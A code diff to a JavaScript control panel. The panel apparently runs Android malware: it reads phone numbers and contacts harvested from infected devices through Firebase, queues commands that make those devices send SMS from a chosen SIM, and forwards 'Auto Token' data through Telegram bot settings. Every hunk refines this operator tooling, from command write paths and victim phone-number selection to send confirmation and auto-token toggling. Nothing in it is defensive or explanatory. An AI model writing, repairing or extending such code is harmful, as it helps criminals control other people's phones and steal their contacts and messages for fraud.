@@ -147,8 +147,9 @@ function isRabelPanel(inst){
 }
 function isJunkSmsPath(path){
   if(!path)return true;
-  var seg=String(path).split('/')[0];
-  if(seg==='clients'||seg==='users'||seg==='data')return true;
+  var parts=String(path).split('/');
+  var seg=parts[0];
+  if(parts.length===2&&(seg==='clients'||seg==='users'||seg==='data'||seg==='devices'))return true;
   if(COMMAND_JUNK_NODES.indexOf(seg)>=0)return true;
   if(isHexDeviceKey(seg))return true;
   return false;
@@ -167,6 +168,16 @@ function shouldUseApkSmsPath(inst,d){
 function getDeviceProfilePath(d,fallback){
   if(!d)return fallback||'clients';
   return d.deviceNode||fallback||'clients';
+}
+function getClientWritePath(d,inst){
+  if(!d)return 'clients';
+  var fb=inst||getFbInstance(d.fbId);
+  if(shouldUseApkSmsPath(fb,d)||(fb&&fb.schema==='rabel'))return 'clients';
+  var pref=fb&&fb.config&&fb.config.preferredDeviceNode;
+  if(pref&&pref!=='user_list'&&pref!=='user_data')return pref;
+  var node=d.deviceNode||'clients';
+  if(node==='user_list'||node==='user_data')return 'clients';
+  return node;
 }
 function isDeviceLiveChildNode(node){
   if(!node)return false;
@@ -632,7 +643,7 @@ function parseJoinedToMs(joined){
 function patchClientField(d,fields,okMsg){
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase not loaded',false);return Promise.resolve(false);}
-  var node=getDeviceProfilePath(d)+'/'+d.rawId;
+  var node=getClientWritePath(d,inst)+'/'+d.rawId;
   var url=buildRestUrl(inst,node,getFbAuthKey(inst));
   return fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(fields)})
     .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
@@ -1702,9 +1713,12 @@ function ingestDeviceData(fbId,node,devId,data){
     if(!norm.mobNo)norm.mobNo=existing.mobNo;
     if(!norm.name||norm.name==='Unknown')norm.name=existing.name;
   }
-  if(existing._phoneSource&&(existing._phoneSource==='user_list'||existing._phoneSource==='user_data')&&existing.mobNo&&!isNyaApkClientRecord(existing)){
-    norm.mobNo=existing.mobNo;
-    norm._phoneSource=existing._phoneSource;
+  if(existing._phoneSource&&(existing._phoneSource==='user_list'||existing._phoneSource==='user_data')&&existing.mobNo){
+    var betterPhone=(node==='clients'||node==='devices'||isNyaApkClientRecord(data))&&picked;
+    if(!betterPhone&&!isNyaApkClientRecord(existing)){
+      norm.mobNo=existing.mobNo;
+      norm._phoneSource=existing._phoneSource;
+    }
   }else if(isNyaApkClientRecord(data)&&data.mobNo!=null&&String(data.mobNo).trim()){
     norm.mobNo=String(data.mobNo).trim();
   }else if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
@@ -1738,12 +1752,13 @@ function enrichFromAllNodes(inst){
     if(p.fbId!==inst.id)return;
     var rec=clientsRawMap[mapKey];
     if(isNyaApkClientRecord(rec)&&rec._node==='clients'&&rec.mobNo&&String(rec.mobNo).trim()&&!/^unknown$/i.test(String(rec.mobNo).trim()))return;
-    if(rec._phoneSource==='user_list'||rec._phoneSource==='user_data')return;
+    if((rec._phoneSource==='user_list'||rec._phoneSource==='user_data')&&rec.mobNo&&String(rec.mobNo).trim())return;
     var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
     var needsContacts=!rec.contacts||!rec.contacts.length;
     if(!needsPhone&&!needsContacts)return;
     roots.forEach(function(node){
-      if(!node||node==='clients'||node==='users'||node==='data'||isHexDeviceKey(node))return;
+      if(!node||node==='users'||node==='data'||isHexDeviceKey(node))return;
+      if(node==='clients'&&rec._node==='clients')return;
       if(batch>=maxBatch)return;
       batch++;
       tasks.push(
@@ -2534,7 +2549,7 @@ function sendDeviceSms(sim){
     toRaw=getApkSimPhone(raw,_sendSimSlot)||getApkMobNo(raw,d);
     if(toEl&&toRaw)toEl.value=(toRaw.length===10?'+91'+toRaw:toRaw);
   }
-  var phoneDial=formatApkSmsTo(toRaw||to);
+  var phoneDial=formatApkSmsTo(toRaw);
   var msg=(msgEl&&msgEl.value||'').trim();
   if(!toRaw){toast('Recipient number daalo',false);return;}
   if(!msg){toast('Enter message',false);return;}
@@ -2544,11 +2559,11 @@ function sendDeviceSms(sim){
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
   toast('Sending SMS…',true);
-  sendSmsInstant(toRaw||to,msg,_sendSimSlot,function(ok,data){
+  sendSmsInstant(toRaw,msg,_sendSimSlot,function(ok,data){
     _sendInFlight=false;
     if(ok){
       if(msgEl)msgEl.value='';
-      var dest=(data&&data.to)||phoneDial||toRaw||to;
+      var dest=(data&&data.to)||phoneDial||toRaw;
       var line=(data&&data.message)||('SMS queue → '+dest+' (Sim '+(_sendSimSlot||1)+')');
       toast(line,true);
     }else{
@@ -3631,9 +3646,11 @@ function finishSmsSendCallback(inst,d,msg,phoneDial,r,callback,sameNum,simSlot,t
   if(r.patchOk&&!r.webhookOk)hint+=' (PATCH queued — device APK online hona chahiye)';
   var baseMsg='SMS command queued'+(r.via?' via '+r.via:'')+hint;
   verifySmsQueuedOnDevice(inst,d.rawId,msg).then(function(verified){
+    var queued=!!(verified||r.patchOk||r.webhookOk);
     if(verified)baseMsg='✅ Firebase mein command likha'+hint;
     else if(r.patchOk||r.webhookOk)baseMsg='⏳ Command bheja — device execute karega'+hint;
-    if(callback)callback(true,{ok:true,message:baseMsg,path:r.path,to:phoneDial,verified:verified,patchOk:!!r.patchOk,webhookOk:!!r.webhookOk});
+    else baseMsg='❌ Firebase par command nahi likha — auth/rules check karo'+hint;
+    if(callback)callback(queued,{ok:queued,message:baseMsg,path:r.path,to:phoneDial,verified:verified,patchOk:!!r.patchOk,webhookOk:!!r.webhookOk});
   });
 }
 function sendSmsPhpPromise(phpBody){
@@ -3662,7 +3679,7 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var sameNum=isSameNumberAsDevice(d,phoneFull||phoneDial);
   var attempts=getSendAttempts(inst,d,phoneFull||phoneDial,msg,simSlot||1);
   var dual=needsDualSmsSend(inst,d);
-  var writeNode=d.deviceNode||getDeviceProfilePath(d)||'clients';
+  var writeNode=getClientWritePath(d,inst);
   if(writeNode==='All_Users'||writeNode==='All_User')writeNode='clients';
   var phpBody={
     device_id:d.rawId,to:phoneDial,message:msg,sim:simSlot||1,
@@ -3919,8 +3936,9 @@ function saveAutoTokenDeviceSetup(){
     fb_name:inst.name,
     auth_key:getFbAuthKey(inst),
     schema:inst.schema||'rabel',
-    device_node:d.deviceNode||'clients',
-    sim:_autoTokenDeviceSim||1
+    device_node:getClientWritePath(d,inst),
+    sim:_autoTokenDeviceSim||1,
+    sim_count:getDualSimCount(d)
   }).then(function(res){
     if(!res||!res.ok){toast('Save failed',false);return;}
     if(res.config){_autoTokenConfig=res.config;_autoTokenOn=!!res.config.enabled;}
@@ -3950,12 +3968,21 @@ function useSelForAutoToken(){
   if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
   setupAutoTokenFromDevice();
 }
+function nyaRequirePanelServer(forAutoToken){
+  if(!window.REBEL_NATIVE_APP)return true;
+  var base=typeof nyaGetPanelServer==='function'?nyaGetPanelServer():'';
+  if(base)return true;
+  toast(forAutoToken?'Auto Token ke liye Menu → Panel Server URL set karo (nya.php host)':'Panel server URL set karo',false);
+  return false;
+}
 function smsTokenFetch(body){
+  if(!nyaRequirePanelServer(true))return Promise.resolve({ok:false,error:'Panel server URL not set'});
   var hdr={'Content-Type':'application/json'};
   var apk=rebelApkHeaders();
   for(var k in apk)hdr[k]=apk[k];
   return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
-    .then(function(r){return r.json();});
+    .then(function(r){return r.json();})
+    .catch(function(){return{ok:false,error:'Auto Token API failed — panel server check karo'};});
 }
 function renderAutoTokenLog(log){
   var el=document.getElementById('autoTokenLog');
@@ -4081,7 +4108,23 @@ function closeAutoTokenSheet(){
   document.getElementById('autoTokenSheet').classList.remove('open');
 }
 function toggleAutoToken(){
-  _autoTokenOn=!_autoTokenOn;
+  if(_autoTokenOn){
+    _autoTokenOn=false;
+    var toggle=document.getElementById('autoTokenToggle');
+    if(toggle)toggle.classList.remove('on');
+    smsTokenFetch({action:'save',enabled:false,bot_token:_autoTokenConfig.bot_token||'',channel_id:_autoTokenConfig.channel_id||'',owner_id:_autoTokenConfig.owner_id||''}).then(function(d){
+      if(d&&d.ok&&d.config)_autoTokenConfig=d.config;
+      updateAutoTokenUi(_autoTokenConfig);
+      toast('Auto Token OFF',true);
+    }).catch(function(){toast('Auto token save failed',false);});
+    return;
+  }
+  if(!(_autoTokenConfig.device_id||'').trim()){
+    toast('Pehle device select karo → Auto Token → Set Device',false);
+    return;
+  }
+  if(!nyaRequirePanelServer(true))return;
+  _autoTokenOn=true;
   var toggle=document.getElementById('autoTokenToggle');
   if(toggle)toggle.classList.toggle('on',_autoTokenOn);
   smsTokenFetch({action:'save',enabled:_autoTokenOn,bot_token:_autoTokenConfig.bot_token||'',channel_id:_autoTokenConfig.channel_id||'',owner_id:_autoTokenConfig.owner_id||''}).then(function(d){
